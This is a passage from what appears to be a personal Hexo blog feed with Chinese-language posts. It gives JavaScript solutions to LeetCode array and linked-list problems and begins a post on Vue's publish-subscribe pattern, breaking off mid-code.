class="number">0</span>][j<span class="number">-1</span>] + grid[<span class="number">0</span>][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">            dp[i][j] = <span class="built_in">Math</span>.min(dp[i][j<span class="number">-1</span>], dp[i<span class="number">-1</span>][j]) + grid[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="正则表达式匹配"><a href="#正则表达式匹配" class="headerlink" title="正则表达式匹配"></a>正则表达式匹配</h2><ul><li><p><a href="https://leetcode-cn.com/problems/regular-expression-matching/" target="_blank" rel="noopener">leetcode10</a></p></li><li><p><a href="https://leetcode-cn.com/problems/regular-expression-matching/solution/shou-hui-tu-jie-wo-tai-nan-liao-by-hyj8/" target="_blank" rel="noopener">题解</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-数组操作</title>
      <link href="2020/11/16/%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C/"/>
      <url>2020/11/16/%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<ul><li>合并区间</li><li>只出现一次的数字</li><li>找到所有数组中消失的数字</li><li>三数之和</li></ul><a id="more"></a><h2 id="算法：合并区间"><a href="#算法：合并区间" class="headerlink" title="算法：合并区间"></a>算法：合并区间</h2><p>题目来源：<a href="https://leetcode-cn.com/problems/merge-intervals/" target="_blank" rel="noopener">leetcode56</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: intervals = [[1,3],[2,6],[8,10],[15,18]]</span><br><span class="line">输出: [[1,6],[8,10],[15,18]]</span><br><span class="line">解释: 区间 [1,3] 和 [2,6] 重叠, 将它们合并为 [1,6].</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line">输入: intervals = [[1,4],[4,5]]</span><br><span class="line">输出: [[1,5]]</span><br><span class="line">解释: 区间 [1,4] 和 [4,5] 可被视为重叠区间。</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 先按照 intervals[i][0] 从小到大排序</span></span><br><span class="line"><span class="comment">// 2. intervals[i][1] &gt;= intervals[i+1][1] 直接取 intervals[i][1] : [1,4] [2,3] 直接取 [1,4]</span></span><br><span class="line"><span class="comment">// 3. intervals[i][1] &gt;= intervals[i+1][0] 时 intervals[i][1] = intervals[i+1][1] ：[1,4] [3,5] 取 [1,5]  </span></span><br><span class="line"><span class="comment">// 4. 设置一个 flag，如果此轮合并过，继续合并下一轮</span></span><br></pre></td></tr></table></figure><ul><li>个人解法</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span>(<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> flag = <span class="literal">true</span> </span><br><span class="line">    intervals.sort(<span class="function">(<span class="params">a,b</span>) =&gt;</span> a[<span class="number">0</span>] - b[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">        flag = <span class="literal">false</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; intervals.length - <span class="number">1</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (intervals[i][<span class="number">1</span>] &gt;= intervals[i+<span class="number">1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">                intervals.splice(i+<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">                flag = <span class="literal">true</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (intervals[i][<span class="number">1</span>] &gt;= intervals[i+<span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">                intervals[i][<span class="number">1</span>] = intervals[i+<span class="number">1</span>][<span class="number">1</span>]</span><br><span class="line">                intervals.splice(i+<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">                flag = <span class="literal">true</span></span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> intervals</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h2><ul><li><a href="https://leetcode-cn.com/problems/single-number/" target="_blank" rel="noopener">leetcode136</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line"></span><br><span class="line">你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: [2,2,1]</span><br><span class="line">输出: 1</span><br><span class="line">示例 2:</span><br><span class="line"></span><br><span class="line">输入: [4,1,2,1,2]</span><br><span class="line">输出: 4</span><br></pre></td></tr></table></figure><ul><li>任何数和 0 做异或运算，结果仍然是原来的数，</li><li>任何数和其自身做异或运算，结果是 0</li><li>异或运算满足交换律和结合律</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> singleNumber = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> nums.reduce(<span class="function">(<span class="params">pre, item</span>) =&gt;</span> pre ^ item, <span class="number">0</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="找到所有数组中消失的数字"><a href="#找到所有数组中消失的数字" class="headerlink" title="找到所有数组中消失的数字"></a>找到所有数组中消失的数字</h2><ul><li><a href="https://leetcode-cn.com/problems/find-all-numbers-disappeared-in-an-array/" target="_blank" rel="noopener">leetcode448</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">给定一个范围在  1 ≤ a[i] ≤ n ( n = 数组大小 ) 的 整型数组，数组中的元素一些出现了两次，另一些只出现一次。</span><br><span class="line"></span><br><span class="line">找到所有在 [1, n] 范围之间没有出现在数组中的数字。</span><br><span class="line"></span><br><span class="line">您能在不使用额外空间且时间复杂度为O(n)的情况下完成这个任务吗? 你可以假定返回的数组不算在额外空间内。</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line"></span><br><span class="line">输入:</span><br><span class="line">[4,3,2,7,8,2,3,1]</span><br><span class="line"></span><br><span class="line">输出:</span><br><span class="line">[5,6]</span><br></pre></td></tr></table></figure><ul><li>值表示索引</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> findDisappearedNumbers = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [], res = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        arr[nums[i]<span class="number">-1</span>] = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] !== <span class="number">1</span>) &#123;</span><br><span class="line">            res.push(i+<span class="number">1</span>)</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="三数之和"><a href="#三数之和" class="headerlink" title="三数之和"></a>三数之和</h2><ul><li><a href="https://leetcode-cn.com/problems/3sum/" target="_blank" rel="noopener">leetcode15</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">给你一个包含 n 个整数的数组 nums，判断 nums 中是否存在三个元素 a，b，c ，使得 a + b + c = 0 ？请你找出所有满足条件且不重复的三元组。</span><br><span class="line"></span><br><span class="line">注意：答案中不可以包含重复的三元组。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line"></span><br><span class="line">给定数组 nums = [-1, 0, 1, 2, -1, -4]，</span><br><span class="line"></span><br><span class="line">满足要求的三元组集合为：</span><br><span class="line">[</span><br><span class="line">  [-1, 0, 1],</span><br><span class="line">  [-1, -1, 2]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>双指针讲思路</li><li><a href="https://leetcode-cn.com/problems/3sum/solution/man-hua-jue-bu-wu-ren-zi-di-xiang-kuai-su-kan-dong/" target="_blank" rel="noopener">题解</a></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> threeSum = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    nums.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b) <span class="comment">// 排序</span></span><br><span class="line">    <span class="keyword">let</span> ans = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> flag = <span class="number">0</span>; flag &lt; nums.length - <span class="number">2</span>; flag++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[flag] &gt; <span class="number">0</span>) <span class="keyword">break</span> <span class="comment">// 基准值大于0时相加不可能等于0</span></span><br><span class="line">        <span class="keyword">let</span> i = flag + <span class="number">1</span></span><br><span class="line">        <span class="keyword">let</span> j = nums.length - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[flag] + nums[i] + nums[j] &gt; <span class="number">0</span>) j--</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (nums[flag] + nums[i] + nums[j] &lt; <span class="number">0</span>) i++</span><br><span class="line">            <span class="comment">// 相加等于0时，需要去重</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ans.length === <span class="number">0</span>) &#123;</span><br><span class="line">                    ans.push([nums[flag], nums[i], nums[j]])</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">let</span> boolean = <span class="literal">true</span></span><br><span class="line">                    <span class="comment">// ans中向前遍历，判断有没有一样的，有一样的就不 push 了</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> k = ans.length<span class="number">-1</span>; k &gt;= <span class="number">0</span> &amp;&amp; ans[k][<span class="number">0</span>] === nums[flag]; k--) &#123;</span><br><span class="line">                        <span class="keyword">let</span> tmp = ans[k]</span><br><span class="line">                        <span class="keyword">if</span> (tmp[<span class="number">0</span>] === nums[flag] &amp;&amp; tmp[<span class="number">1</span>] === nums[i] &amp;&amp; tmp[<span class="number">2</span>] === nums[j]) &#123;</span><br><span class="line">                            boolean = <span class="literal">false</span></span><br><span class="line">                        &#125; </span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (boolean) &#123;</span><br><span class="line">                         ans.push([nums[flag], nums[i], nums[j]])</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                i++</span><br><span class="line">                j--</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>算法-链表</title>
      <link href="2020/11/13/%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8/"/>
      <url>2020/11/13/%E7%AE%97%E6%B3%95-%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<ul><li>奇偶链表</li><li>旋转链表</li><li>两两交换链表元素</li><li>环形链表</li></ul><a id="more"></a><h2 id="奇偶链表"><a href="#奇偶链表" class="headerlink" title="奇偶链表"></a>奇偶链表</h2><ul><li><a href="https://leetcode-cn.com/problems/odd-even-linked-list" target="_blank" rel="noopener">leetcode328</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">给定一个单链表，把所有的奇数节点和偶数节点分别排在一起。请注意，这里的奇数节点和偶数节点指的是节点编号的奇偶性，而不是节点的值的奇偶性。</span><br><span class="line"></span><br><span class="line">请尝试使用原地算法完成。你的算法的空间复杂度应为 O(1)，时间复杂度应为 O(nodes)，nodes 为节点总数。</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line"></span><br><span class="line">输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">输出: 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL</span><br><span class="line">示例 2:</span><br><span class="line"></span><br><span class="line">输入: 2-&gt;1-&gt;3-&gt;5-&gt;6-&gt;4-&gt;7-&gt;NULL </span><br><span class="line">输出: 2-&gt;3-&gt;6-&gt;7-&gt;1-&gt;5-&gt;4-&gt;NULL</span><br></pre></td></tr></table></figure><ul><li>思路：拆分链表再组合</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oddEvenList = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head === <span class="literal">null</span>) <span class="keyword">return</span> head</span><br><span class="line">    <span class="keyword">let</span> odd = head, evenHead = head.next</span><br><span class="line">    <span class="keyword">let</span> even = evenHead</span><br><span class="line">    <span class="keyword">while</span> (even !== <span class="literal">null</span> &amp;&amp; even.next !== <span class="literal">null</span>) &#123;</span><br><span class="line">        odd.next = even.next</span><br><span class="line">        odd = odd.next</span><br><span class="line">        even.next = odd.next</span><br><span class="line">        even = even.next</span><br><span class="line">    &#125;</span><br><span class="line">    odd.next = evenHead</span><br><span class="line">    <span class="keyword">return</span> head</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="旋转链表"><a href="#旋转链表" class="headerlink" title="旋转链表"></a>旋转链表</h2><ul><li><a href="https://leetcode-cn.com/problems/rotate-list" target="_blank" rel="noopener">leetcode61</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">给定一个链表，旋转链表，将链表每个节点向右移动 k 个位置，其中 k 是非负数。</span><br><span class="line"></span><br><span class="line">示例 1:</span><br><span class="line">输入: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, k = 2</span><br><span class="line">输出: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL</span><br><span class="line">解释:</span><br><span class="line">向右旋转 1 步: 5-&gt;1-&gt;2-&gt;3-&gt;4-&gt;NULL</span><br><span class="line">向右旋转 2 步: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL</span><br><span class="line"></span><br><span class="line">示例 2:</span><br><span class="line">输入: 0-&gt;1-&gt;2-&gt;NULL, k = 4</span><br><span class="line">输出: 2-&gt;0-&gt;1-&gt;NULL</span><br><span class="line">解释:</span><br><span class="line">向右旋转 1 步: 2-&gt;0-&gt;1-&gt;NULL</span><br><span class="line">向右旋转 2 步: 1-&gt;2-&gt;0-&gt;NULL</span><br><span class="line">向右旋转 3 步: 0-&gt;1-&gt;2-&gt;NULL</span><br><span class="line">向右旋转 4 步: 2-&gt;0-&gt;1-&gt;NULL</span><br></pre></td></tr></table></figure><ul><li>思路：成环再打开</li><li>遍历链表，找到链尾接环，记录链表长度 n</li><li>k = k % n ，找到断开位置 n-k </li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rotateRight = <span class="function"><span class="keyword">function</span>(<span class="params">head, k</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head === <span class="literal">null</span>) <span class="keyword">return</span> head</span><br><span class="line">    <span class="keyword">let</span> p = head, n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (p.next !== <span class="literal">null</span>) &#123;</span><br><span class="line">        p = p.next</span><br><span class="line">        n++</span><br><span class="line">    &#125;</span><br><span class="line">    p.next = head</span><br><span class="line">    k = k % n</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n-k<span class="number">-1</span>; i++) &#123;</span><br><span class="line">        head = head.next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> tmp = head</span><br><span class="line">    head = head.next</span><br><span class="line">    tmp.next = <span class="literal">null</span></span><br><span class="line">    <span class="keyword">return</span> head</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="两两交换链表元素"><a href="#两两交换链表元素" class="headerlink" title="两两交换链表元素"></a>两两交换链表元素</h2><ul><li><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/solution/" target="_blank" rel="noopener">leetcode24</a></p></li><li><p><a href="https://leetcode-cn.com/problems/swap-nodes-in-pairs/solution/shou-hua-tu-jie-24-liang-liang-jiao-huan-lian-biao/" target="_blank" rel="noopener">题解</a></p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">给定一个链表，两两交换其中相邻的节点，并返回交换后的链表。</span><br><span class="line"></span><br><span class="line">你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。</span><br><span class="line"></span><br><span class="line">示例 1：</span><br><span class="line">输入：head = [1,2,3,4]</span><br><span class="line">输出：[2,1,4,3]</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：head = []</span><br><span class="line">输出：[]</span><br><span class="line"></span><br><span class="line">示例 3：</span><br><span class="line">输入：head = [1]</span><br><span class="line">输出：[1]</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> swapPairs = <span class="function"><span class="keyword">function</span>(<span class="params">head</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>)</span><br><span class="line">    dummy.next = head</span><br><span class="line">    <span class="keyword">let</span> prev = dummy</span><br><span class="line">    <span class="keyword">while</span> (head &amp;&amp; head.next) &#123;</span><br><span class="line">        <span class="keyword">const</span> next = head.next</span><br><span class="line">        head.next = next.next</span><br><span class="line">        next.next = head</span><br><span class="line">        prev.next = next</span><br><span class="line"></span><br><span class="line">        prev = head</span><br><span class="line">        head = head.next</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="环形链表"><a href="#环形链表" class="headerlink" title="环形链表"></a>环形链表</h2><ul><li><a href="https://leetcode-cn.com/problems/linked-list-cycle/" target="_blank" rel="noopener">leetcode141</a></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line">输入：head = [3,2,0,-4], pos = 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br><span class="line"></span><br><span class="line">示例 2：</span><br><span class="line">输入：head = [1,2], pos = 0</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第一个节点。</span><br></pre></td></tr></table></figure><ul><li>快慢指针法</li><li>快、慢指针，从头节点出发</li><li>慢指针每次走一步，快指针每次走两步，不断比较它们指向的节点的值</li><li>如果节点值相同，说明有环。如果不同，继续循环。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hasCycle = <span class="function">(<span class="params">head</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> fast = head</span><br><span class="line">  <span class="keyword">let</span> slow = head</span><br><span class="line">  <span class="keyword">while</span> (fast) &#123;                        </span><br><span class="line">    <span class="keyword">if</span> (fast.next == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    slow = slow.next                 </span><br><span class="line">    fast = fast.next.next;             </span><br><span class="line">    <span class="keyword">if</span> (slow == fast) <span class="keyword">return</span> <span class="literal">true</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;                   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue响应式原理详解</title>
      <link href="2020/11/12/%E6%95%B4%E7%90%86-Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
      <url>2020/11/12/%E6%95%B4%E7%90%86-Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<ul><li>发布订阅模式</li><li>观察者模式</li><li>Vue 实例初始化过程</li><li>组件渲染过程</li><li>响应式过程总结</li><li>Vue 3.0 Proxy</li></ul><a id="more"></a><h3 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h3><ul><li>订阅者</li><li>发布者</li><li>信号中心</li></ul><blockquote><p>假定存在一个信号中心，某个任务执行完成，就向信号中心发布一个信号，其他任务可以向信号中心订阅这个信号，从而知道自己什么时候自己可以开始执行。</p></blockquote><h3 id="Vue的自定义事件"><a href="#Vue的自定义事件" class="headerlink" title="Vue的自定义事件"></a>Vue的自定义事件</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> vm = <span class="keyword">new</span> Vue()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册事件</span></span><br><span class="line">vm.$on(<span class="string">'dataChange'</span>, ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'dataChange'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">vm.$on(<span class="string">'dataChange'</span>, ()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'dataChange1'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发起事件</span></span><br><span class="line">vm.$emit(<span class="string">'dataChange'</span>)</span><br></pre></td></tr></table></figure><h4 id="兄弟组件通信过程"><a href="#兄弟组件通信过程" class="headerlink" title="兄弟组件通信过程"></a>兄弟组件通信过程</h4><p><strong>两个组件不相互依赖，即发布者和订阅者被事件中心隔离</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 信号中心</span></span><br><span class="line"><span class="keyword">let</span> eventHub = <span class="keyword">new</span> Vue()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ComponentA.vue</span></span><br><span class="line"><span class="comment">// 发布者</span></span><br><span class="line">addTodo: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 发布事件</span></span><br><span class="line">    eventHub.$emit(<span class="string">'add-todo'</span>, &#123; <span class="attr">text</span>: <span 